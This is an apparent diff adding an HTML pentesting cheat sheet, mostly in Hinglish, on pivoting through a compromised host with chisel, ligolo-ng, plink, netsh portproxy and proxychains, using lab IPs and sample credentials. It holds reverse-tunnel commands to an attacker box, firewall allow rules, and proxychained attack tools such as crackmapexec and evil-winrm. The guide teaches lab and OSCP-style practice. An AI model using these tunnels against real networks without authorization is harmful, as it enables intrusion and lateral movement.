+          <tr><td class="flag">Connection closes after exactly one client</td><td class="fdesc">You forgot the <code style="color:var(--accent)">,fork</code> option — without it socat exits after the first connection ends.</td></tr>
+          <tr><td class="flag">bind: Permission denied (listen port &lt; 1024)</td><td class="fdesc">On Linux, ports below 1024 need root. Use a high port instead (e.g. 8080) or run with sudo.</td></tr>
+          <tr><td class="flag">AV flags/deletes socat.exe on upload</td><td class="fdesc">Generic network utilities get flagged by signature-based AV fairly often; this is expected behaviour of defensive tooling, not something to bypass — note it in your report as a detection opportunity for blue team.</td></tr>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── CHISEL ── -->
+  <section id="chisel">
+    <div class="sec-head"><span class="sec-num">07</span><h2>Chisel</h2></div>
+    <p class="sec-desc">
+      HTTP-based tunnelling tool — compiled Go binary, Windows aur Linux dono ke liye available.
+      Firewalls jo SSH block karte hain woh aksar HTTP traffic allow karte hain, isliye yeh bahut
+      useful hai modern environments mein. OSCP mein bhi commonly use hota hai.
+    </p>
+
+    <div class="sub-sec">
+      <h3>Flow diagram</h3>
+      <div class="diagram"><span class="dc">ATTACKER</span><span class="ac"> ←—————————————— HTTP tunnel ——————————————— </span><span class="wc">PIVOT01</span>
+<span class="dc">chisel server</span><span class="ac">                                           </span><span class="dc">chisel client</span></div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Step 1: Attacker par chisel server chalao</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">ATTACKER BOX</span></div>
+        <pre>./chisel server -p <span class="w">8000</span> --reverse
+<span class="d"># --reverse flag: pivot se reverse connections allow karta hai</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Step 2: PIVOT01 par chisel client — single port forward</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01</span></div>
+        <pre>./chisel client <span class="c">10.10.14.5</span>:<span class="w">8000</span> R:<span class="w">3389</span>:<span class="c">10.10.10.6</span>:<span class="w">3389</span>
+<span class="d">#                             └── R matlab reverse (attacker par port khulega)</span>
+<span class="d">#                                 3389:10.10.10.6:3389 = attacker:3389 → FILESRV01:3389</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>SOCKS proxy via chisel (pura subnet access)</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01</span></div>
+        <pre>./chisel client <span class="c">10.10.14.5</span>:<span class="w">8000</span> R:socks
+<span class="d"># Default SOCKS5 port: 1080 on attacker machine</span></pre>
+      </div>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">ATTACKER BOX — /etc/proxychains.conf</span></div>
+        <pre>socks5  127.0.0.1  <span class="w">1080</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Chisel ke flag meanings</h3>
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Flag</th><th>Matlab</th></tr>
+          <tr><td class="flag">R:PORT:IP:PORT</td><td class="fdesc">Reverse forward — attacker ke machine par port khulega aur traffic pivot se target tak jayega.</td></tr>
+          <tr><td class="flag">R:socks</td><td class="fdesc">Reverse SOCKS5 proxy — attacker par 1080 par SOCKS listener shuru hota hai.</td></tr>
+          <tr><td class="flag">--reverse</td><td class="fdesc">Server flag — reverse connections allow karta hai (client se R: prefix wale forwards ke liye zaroori).</td></tr>
+        </table>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>⚠ Troubleshoot — Chisel</h3>
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Error / Symptom</th><th>Cause &amp; Fix</th></tr>
+          <tr><td class="flag">dial tcp: connection refused</td><td class="fdesc">Server isn't running, wrong port, or a firewall is in the way. Confirm with <code style="color:var(--accent)">curl http://&lt;attacker-ip&gt;:8000</code> from the pivot — chisel server responds with a short banner even without a valid client.</td></tr>
+          <tr><td class="flag">client tries to reconnect forever, never succeeds</td><td class="fdesc">Usually means <code style="color:var(--accent)">--reverse</code> was left off the server command — add it if the client is using <code style="color:var(--accent)">R:</code> forwards.</td></tr>
+          <tr><td class="flag">Architecture mismatch / "exec format error"</td><td class="fdesc">You downloaded the wrong binary — match OS and CPU arch exactly (e.g. <code style="color:var(--accent)">chisel_windows_amd64.exe</code> vs <code style="color:var(--accent)">chisel_linux_amd64</code>).</td></tr>
+          <tr><td class="flag">Self-signed cert / fingerprint mismatch warning</td><td class="fdesc">Pin the expected fingerprint with <code style="color:var(--accent)">--fingerprint &lt;value&gt;</code> on the client once you've confirmed it out-of-band, to avoid MITM on the tunnel itself.</td></tr>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── LIGOLO ── -->
+  <section id="ligolo">
+    <div class="sec-head"><span class="sec-num">08</span><h2>Ligolo-ng</h2></div>
+    <p class="sec-desc">
+      Sabse advanced option — tun interface banata hai attacker ke machine par, jiski wajah se
+      poora internal subnet routable ho jata hai. Nmap, RDP, SMB sab seedha IP se kaam karte hain
+      bina proxychains ke. Alag-alag ports forward karne ki zaroorat nahi padti.
+    </p>
+
+    <div class="sub-sec">
+      <h3>Step 1: Attacker par proxy server chalao</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">ATTACKER BOX</span></div>
+        <pre>sudo ./proxy -selfcert
+<span class="d"># -selfcert: self-signed certificate generate karta hai TLS ke liye</span>
+<span class="d"># Default listening port: 11601</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Step 2: PIVOT01 par agent chalao</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01 (Windows/Linux)</span></div>
+        <pre>./agent -connect <span class="c">10.10.14.5</span>:<span class="w">11601</span> -ignore-cert
+<span class="d"># -ignore-cert: self-signed certificate warning ignore karo</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Step 3: Attacker proxy console mein session setup</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">ATTACKER BOX — ligolo console</span></div>
+        <pre>session              <span class="d"># connected agents list aayegi</span>
+1                    <span class="d"># agent select karo</span>
+start                <span class="d"># tunnel shuru karo</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Step 4: Route add karo internal subnet ke liye</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">ATTACKER BOX (new terminal)</span></div>
+        <pre>sudo ip route add <span class="c">10.10.10.0/24</span> dev ligolo
+<span class="d"># Ab attacker seedha 10.10.10.x range ko reach kar sakta hai</span>
+<span class="d"># bina kisi proxy ke — normal tools direct kaam karenge</span>
+
+ping <span class="c">10.10.10.6</span>          <span class="d"># test karo</span>
+nmap -sV <span class="c">10.10.10.6</span>      <span class="d"># seedha scan — no proxychains needed</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>⚠ Troubleshoot — Ligolo-ng</h3>
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Error / Symptom</th><th>Cause &amp; Fix</th></tr>
+          <tr><td class="flag">RTNETLINK answers: Operation not permitted</td><td class="fdesc">The <code style="color:var(--accent)">ip route add</code> step needs root — always run the route command with <code style="color:var(--accent)">sudo</code> on the attacker box.</td></tr>
+          <tr><td class="flag">No ligolo interface found</td><td class="fdesc">The <code style="color:var(--accent)">./proxy</code> process creates the <code style="color:var(--accent)">ligolo</code> tun interface only once a session has <code style="color:var(--accent)">start</code>-ed. Confirm with <code style="color:var(--accent)">ip a | grep ligolo</code> after starting the tunnel, not before.</td></tr>
+          <tr><td class="flag">x509: certificate signed by unknown authority</td><td class="fdesc">Add <code style="color:var(--accent)">-ignore-cert</code> to the agent command — expected when using <code style="color:var(--accent)">-selfcert</code> on the proxy side.</td></tr>
+          <tr><td class="flag">Agent connects but Windows targets unreachable</td><td class="fdesc">On Windows pivots the agent needs the bundled <code style="color:var(--accent)">wintun.dll</code> in the same folder, and typically Administrator privileges to set up routing properly.</td></tr>
+          <tr><td class="flag">RTNETLINK answers: File exists</td><td class="fdesc">A route to that subnet already exists (e.g. from a previous session). Remove it first: <code style="color:var(--accent)">sudo ip route del 10.10.10.0/24</code>, then re-add.</td></tr>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── PLINK ── -->
+  <section id="plink">
+    <div class="sec-head"><span class="sec-num">09</span><h2>Plink (PuTTY CLI)</h2></div>
+    <p class="sec-desc">
+      Plink PuTTY ka command-line SSH client hai. Jab Windows pivot par OpenSSH client na ho
+      lekin PuTTY suite available ho to plink use karte hain.
+      Iska behavior SSH ke -R flag jaisa hi hai.
+    </p>
+
+    <div class="sub-sec">
+      <h3>Remote port forward (DC01 ka RDP attacker par)</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01 (Windows CMD)</span></div>
+        <pre>plink.exe -ssh -l svc_tunnel -pw <span class="w">S3cur3T0k3n!</span> <span class="c">10.10.14.5</span> -R <span class="w">3389</span>:<span class="c">10.10.10.7</span>:<span class="w">3389</span> -N</pre>
+      </div>
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Flag</th><th>Matlab</th></tr>
+          <tr><td class="flag">-ssh</td><td class="fdesc">SSH protocol use karo (plink telnet bhi support karta hai, isliye explicitly specify karo).</td></tr>
+          <tr><td class="flag">-l svc_tunnel</td><td class="fdesc">SSH login username.</td></tr>
+          <tr><td class="flag">-pw PASSWORD</td><td class="fdesc">Password directly command line mein. Non-interactive environments mein kaam aata hai lekin process list mein visible hota hai.</td></tr>
+          <tr><td class="flag">-R</td><td class="fdesc">SSH ke -R jaisa — remote port forwarding.</td></tr>
+          <tr><td class="flag">-N</td><td class="fdesc">No shell — sirf tunnel.</td></tr>
+        </table>
+      </div>
+      <div class="note"><b>Tip:</b> Plink pehli baar connect hone par host key prompt kar sakta hai. Non-interactive run ke liye pehle manually connect karke key accept karo, ya <span style="color:var(--accent)">-batch</span> flag use karo (auto-accept host key).</div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>⚠ Troubleshoot — Plink</h3>
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Error / Symptom</th><th>Cause &amp; Fix</th></tr>
+          <tr><td class="flag">Plink hangs with no output, nothing happens</td><td class="fdesc">It's waiting on the host key prompt in a non-interactive context. Add <code style="color:var(--accent)">-batch</code> to auto-accept, or pre-seed the key by connecting once interactively.</td></tr>
+          <tr><td class="flag">FATAL ERROR: Network error: Connection timed out</td><td class="fdesc">Attacker-side SSH server unreachable from PIVOT01 — check outbound firewall rules on the pivot and that the attacker's SSH port is actually open externally.</td></tr>
+          <tr><td class="flag">Access denied / password rejected</td><td class="fdesc">Double-check the username/password, and confirm <code style="color:var(--accent)">PasswordAuthentication yes</code> is set on the attacker's sshd_config.</td></tr>
+          <tr><td class="flag">Process visible with plaintext password via tasklist</td><td class="fdesc">Expected limitation of <code style="color:var(--accent)">-pw</code> — anyone with access to view running processes on PIVOT01 can see the password. Prefer key-based auth (<code style="color:var(--accent)">-i key.ppk</code>) where possible.</td></tr>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── NETSH ── -->
+  <section id="netsh">
+    <div class="sec-head"><span class="sec-num">10</span><h2>netsh portproxy (Windows Native)</h2></div>
+    <p class="sec-desc">
+      Koi extra binary upload karne ki zaroorat nahi — Windows ka built-in netsh tool use karta hai.
+      Jab kuch bhi upload nahi kar sakte pivot par to yeh best option hai.
+      Admin privileges chahiye.
+    </p>
+
+    <div class="sub-sec">
+      <h3>Port forward setup</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01 (Admin CMD)</span></div>
+        <pre>netsh interface portproxy add v4tov4 <span class="r">listenport</span>=<span class="w">13389</span> <span class="r">listenaddress</span>=0.0.0.0 <span class="r">connectport</span>=<span class="w">3389</span> <span class="r">connectaddress</span>=<span class="c">10.10.10.6</span></pre>
+      </div>
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Parameter</th><th>Matlab</th></tr>
+          <tr><td class="flag">v4tov4</td><td class="fdesc">IPv4 se IPv4 forward. v4tov6, v6tov4, v6tov6 bhi available hain.</td></tr>
+          <tr><td class="flag">listenport=13389</td><td class="fdesc">PIVOT01 par yeh port incoming connections ke liye sun raha hoga.</td></tr>
+          <tr><td class="flag">listenaddress=0.0.0.0</td><td class="fdesc">Sab interfaces par listen karo (0.0.0.0 = all).</td></tr>
+          <tr><td class="flag">connectport=3389</td><td class="fdesc">Traffic is port par forward hoga target par.</td></tr>
+          <tr><td class="flag">connectaddress=10.10.10.6</td><td class="fdesc">Target machine ka IP jahan traffic forward karna hai.</td></tr>
+        </table>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Manage karo</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01 (Admin CMD)</span></div>
+        <pre>netsh interface portproxy show all           <span class="d"># active forwards dekho</span>
+netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=0.0.0.0  <span class="d"># hatao</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Firewall rule (Windows firewall enabled ho to)</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01 (Admin CMD)</span></div>
+        <pre>netsh advfirewall firewall add rule name="PortProxy 13389" dir=in action=allow protocol=TCP localport=13389</pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>⚠ Troubleshoot — netsh portproxy</h3>
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Error / Symptom</th><th>Cause &amp; Fix</th></tr>
+          <tr><td class="flag">Rule added but nothing forwards</td><td class="fdesc">The "IP Helper" (iphlpsvc) service must be running for portproxy to work: <code style="color:var(--accent)">sc query iphlpsvc</code>, and <code style="color:var(--accent)">sc start iphlpsvc</code> if stopped.</td></tr>
+          <tr><td class="flag">Access is denied when adding the rule</td><td class="fdesc">cmd.exe isn't elevated — reopen as Administrator (Run as administrator), portproxy requires admin rights.</td></tr>
+          <tr><td class="flag">Reachable locally but not from other machines</td><td class="fdesc">Check the Windows Firewall rule actually exists and matches the port: <code style="color:var(--accent)">netsh advfirewall firewall show rule name="PortProxy 13389"</code>.</td></tr>
+          <tr><td class="flag">Rule persists after reboot and causes conflicts later</td><td class="fdesc">portproxy rules survive reboots by default — always clean up with the <code style="color:var(--accent)">delete v4tov4</code> command shown above once you're done.</td></tr>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── PROXYCHAINS ── -->
+  <section id="proxychains">
+    <div class="sec-head"><span class="sec-num">11</span><h2>Proxychains — Tools SOCKS se Route karna</h2></div>
+    <p class="sec-desc">
+      SOCKS tunnel ke baad har tool ko proxy ke through route karne ke liye proxychains use hoti hai.
+      Kisi bhi tool ke aage <code style="color:var(--accent)">proxychains</code> lagao bas.
+    </p>
+
+    <div class="sub-sec">
+      <h3>Config file</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">ATTACKER BOX — /etc/proxychains4.conf (ya proxychains.conf)</span></div>
+        <pre><span class="d"># File ke end mein:</span>
+[ProxyList]
+socks4  127.0.0.1  9050    <span class="d"># SSH dynamic / chisel SOCKS4</span>
+<span class="d"># ya</span>
+socks5  127.0.0.1  1080    <span class="d"># Chisel / Ligolo SOCKS5</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Common tools ke saath proxychains</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">ATTACKER BOX</span></div>
+        <pre>proxychains nmap -sT -Pn -p 80,443,445,3389 <span class="c">10.10.10.6</span>   <span class="d"># -sT aur -Pn zaroori</span>
+proxychains curl http://<span class="c">10.10.10.7</span>/
+proxychains xfreerdp /v:<span class="c">10.10.10.6</span>:<span class="w">3389</span> /u:admin /p:P@ss
+proxychains python3 exploit.py
+proxychains crackmapexec smb <span class="c">10.10.10.0/24</span>
+proxychains evil-winrm -i <span class="c">10.10.10.6</span> -u admin -p P@ssw0rd</pre>
+      </div>
+      <div class="note"><b>nmap ke saath:</b> <b>-sT</b> (TCP Connect scan) aur <b>-Pn</b> (ping skip) lagana zaroori hai — ICMP aur SYN packets SOCKS se nahi chalte. Results thoda slow aur altered aa sakte hain.</div>
+    </div>
+  </section>
+
+  <!-- ── TROUBLESHOOTING ── -->
+  <section id="troubleshoot">
+    <div class="sec-head"><span class="sec-num">12</span><h2>General Troubleshooting — Cross-Tool Diagnostics</h2></div>
+    <p class="sec-desc">
+      Jab koi bhi tunnel kaam na kare, pehle in basic checks se guzro — zyadatar problems in 4 categories mein aati hain:
+      tunnel process chal hi nahi raha, connectivity blocked hai, firewall rok raha hai, ya galat IP/port use ho raha hai.
+    </p>
+
+    <div class="sub-sec">
+      <h3>Step 1 — Confirm the tunnel process is actually listening</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">Linux (attacker ya pivot)</span></div>
+        <pre>ss -tulpn                    <span class="d"># sab listening ports + jo process use kar raha hai</span>
+ss -tulpn | grep 9050        <span class="d"># specific port check karo</span>
+netstat -tulpn               <span class="d"># ss available nahi to yeh purana alternative</span></pre>
+      </div>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">Windows (pivot)</span></div>
+        <pre>netstat -ano | findstr LISTENING
+netstat -ano | findstr :3389
+Get-NetTCPConnection -State Listen   <span class="d"># PowerShell alternative</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Step 2 — Test raw connectivity before blaming the tool</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">Linux</span></div>
+        <pre>nc -zv <span class="c">10.10.10.7</span> <span class="w">3389</span>      <span class="d"># port open hai ya nahi, bina kisi tool ke</span>
+curl -v telnet://<span class="c">10.10.10.7</span>:<span class="w">3389</span>   <span class="d"># agar nc available na ho</span></pre>
+      </div>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">Windows</span></div>
+        <pre>Test-NetConnection -ComputerName <span class="c">10.10.10.7</span> -Port <span class="w">3389</span>
+telnet <span class="c">10.10.10.7</span> <span class="w">3389</span>     <span class="d"># agar Test-NetConnection available na ho</span></pre>
+      </div>
+      <div class="note">Agar yeh Step 2 hi fail ho raha hai, to problem tunnel mein nahi hai — underlying network path hi block hai (firewall, ACL, ya target service down hai). Pehle isse fix karo.</div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Step 3 — Firewall checks (Windows pivot)</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01 (Admin CMD/PowerShell)</span></div>
+        <pre>netsh advfirewall show allprofiles state         <span class="d"># firewall on/off hai</span>
+netsh advfirewall firewall show rule name=all | findstr "13389"   <span class="d"># specific rule check</span>
+Get-NetFirewallRule -DisplayName "*Pivot*"       <span class="d"># PowerShell alternative</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Step 4 — Kill a stuck/zombie tunnel process</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">Linux</span></div>
+        <pre>ps aux | grep ssh            <span class="d"># PID dhoondo</span>
+kill -9 &lt;PID&gt;
+pkill -f "ssh.*-R.*9050"     <span class="d"># pattern se match karke kill</span></pre>
+      </div>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">Windows</span></div>
+        <pre>tasklist | findstr plink
+taskkill /PID &lt;PID&gt; /F
+taskkill /IM socat.exe /F</pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Common root causes — quick lookup</h3>
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Symptom</th><th>Most likely cause</th></tr>
+          <tr><td class="flag">"Connection refused" from attacker</td><td class="fdesc">Tunnel process not running, or wrong listen port — verify with Step 1 above.</td></tr>
+          <tr><td class="flag">"Connection timed out"</td><td class="fdesc">A firewall somewhere in the path is silently dropping packets — most likely culprit when "refused" would at least respond.</td></tr>
+          <tr><td class="flag">Works with ping but not with the actual service</td><td class="fdesc">ICMP allowed but the specific TCP port is firewalled or the service isn't actually running on that port — confirm with Step 2.</td></tr>
+          <tr><td class="flag">Works once, then stops</td><td class="fdesc">Tool without a "fork"/multi-connection option (plain socat without fork, or an SSH session without -f/autossh) died after the first connection closed.</td></tr>
+          <tr><td class="flag">Intermittent / slow</td><td class="fdesc">Usually proxychains timeout settings too low for a congested or high-latency link — raise <code style="color:var(--accent)">tcp_read_time_out</code> / <code style="color:var(--accent)">tcp_connect_time_out</code>.</td></tr>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── QUICK REF ── -->
+  <section id="ref">
+    <div class="sec-head"><span class="sec-num">13</span><h2>Quick Reference — Kab Kya Use Karein</h2></div>
+    <div class="overflow-x">
+      <table class="qref">
+        <tr>
+          <th>Situation</th>
+          <th>Tool</th>
+          <th>Advantages</th>
+          <th>Disadvantages</th>
+        </tr>
+        <tr>
+          <td>SSH client pivot par available hai (Win/Linux)</td>
+          <td class="tool">SSH tunnelling</td>
+          <td class="adv">Built-in, encrypted, flexible</td>
+          <td class="adv">SSH client + server dono chahiye</td>
+        </tr>
+        <tr>
+          <td>SSH nahi, simple single port forward chahiye</td>
+          <td class="tool">socat</td>
+          <td class="adv">Simple syntax, ek command</td>
+          <td class="adv">Binary upload karna padta hai</td>
+        </tr>
+        <tr>
+          <td>HTTP-only egress, SSH/raw TCP block</td>
+          <td class="tool">Chisel</td>
+          <td class="adv">HTTP se chalta hai, firewall bypass</td>
+          <td class="adv">Binary upload karna padta hai</td>
+        </tr>
+        <tr>
+          <td>Pura subnet chahiye, multiple targets</td>
+          <td class="tool">Ligolo-ng</td>
+          <td class="adv">Full routing, no proxychains needed</td>
+          <td class="adv">tun interface ke liye sudo chahiye</td>
+        </tr>
+        <tr>
+          <td>Windows, PuTTY available, no OpenSSH</td>
+          <td class="tool">Plink</td>
+          <td class="adv">PuTTY suite already present ho to</td>
+          <td class="adv">Password command line mein visible</td>
+        </tr>
+        <tr>
+          <td>Kuch bhi upload nahi ho sakta pivot par</td>
+          <td class="tool">netsh portproxy</td>
+          <td class="adv">No extra binary, fully native</td>
+          <td class="adv">Windows only, admin rights chahiye</td>
+        </tr>
+      </table>
+    </div>
+  </section>
+
+  <!-- ── SOURCES ── -->
+  <section id="sources">
+    <div class="sec-head"><span class="sec-num">14</span><h2>Further Reading &amp; Official Sources</h2></div>
+    <div class="overflow-x">
+      <table class="qref">
+        <tr><th>Topic</th><th>Source</th></tr>
+        <tr><td class="tool">OpenSSH manual</td><td class="adv"><a href="https://man.openbsd.org/ssh" style="color:var(--accent);" target="_blank" rel="noopener">man.openbsd.org/ssh</a> — official flag reference (-L, -R, -D, -N, -f)</td></tr>
+        <tr><td class="tool">sshd_config options</td><td class="adv"><a href="https://man.openbsd.org/sshd_config" style="color:var(--accent);" target="_blank" rel="noopener">man.openbsd.org/sshd_config</a> — GatewayPorts, AllowTcpForwarding, PasswordAuthentication</td></tr>
+        <tr><td class="tool">socat manual</td><td class="adv"><a href="http://www.dest-unreach.org/socat/doc/socat.html" style="color:var(--accent);" target="_blank" rel="noopener">dest-unreach.org/socat/doc/socat.html</a></td></tr>
+        <tr><td class="tool">Chisel README</td><td class="adv"><a href="https://github.com/jpillora/chisel" style="color:var(--accent);" target="_blank" rel="noopener">github.com/jpillora/chisel</a> — full flag list and usage examples</td></tr>
+        <tr><td class="tool">Ligolo-ng docs</td><td class="adv"><a href="https://github.com/nicocha30/ligolo-ng" style="color:var(--accent);" target="_blank" rel="noopener">github.com/nicocha30/ligolo-ng</a> — setup guide, double-pivot examples</td></tr>
+        <tr><td class="tool">PuTTY / Plink docs</td><td class="adv"><a href="https://the.earth.li/~sgtatham/putty/0.81/htmldoc/Chapter7.html" style="color:var(--accent);" target="_blank" rel="noopener">the.earth.li/~sgtatham/putty — Chapter 7: Using Plink</a></td></tr>
+        <tr><td class="tool">netsh portproxy reference</td><td class="adv"><a href="https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy" style="color:var(--accent);" target="_blank" rel="noopener">learn.microsoft.com — netsh interface portproxy</a></td></tr>
+        <tr><td class="tool">proxychains-ng</td><td class="adv"><a href="https://github.com/rofl0r/proxychains-ng" style="color:var(--accent);" target="_blank" rel="noopener">github.com/rofl0r/proxychains-ng</a> — the maintained fork used on modern Kali</td></tr>
+        <tr><td class="tool">HTB Academy — Pivoting, Tunneling &amp; Port Forwarding</td><td class="adv">Official module covering the same techniques in a guided lab format</td></tr>
+        <tr><td class="tool">OSCP / PWK coursework</td><td class="adv">Offensive Security's official materials cover SSH tunnelling and proxychains as core pivoting tools for the exam</td></tr>
+      </table>
+    </div>
+  </section>
+
+  <footer>
+    Sab IP addresses, hostnames, credentials aur domain names yahan purely illustrative hain — ek private lab environment ke liye. Real credentials ya infrastructure ka koi data nahi hai.
+  </footer>
+
+</div>
+</body>
+</html>
